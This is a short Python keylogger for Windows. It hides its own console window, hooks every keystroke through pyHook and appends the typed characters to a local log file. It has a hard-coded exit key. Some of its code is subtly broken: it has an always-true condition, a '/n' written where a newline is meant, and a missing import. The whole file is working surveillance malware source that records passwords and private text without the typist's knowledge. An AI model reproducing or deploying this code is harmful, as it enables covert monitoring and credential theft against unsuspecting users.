import win32api
import win32console
import win32gui
import pythoncom,pyHook
from os import name
from os_detect import OsDetect

path_obj= OsDetect()

win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
        f=open(path_obj.get_os_for_file_name,'r+')
        buffer=f.read()
        f.close()
        f=open(path_obj.get_os_for_file_name,'w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs='/n'
        buffer+=keylogs
        f.write(buffer)
        f.close()
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
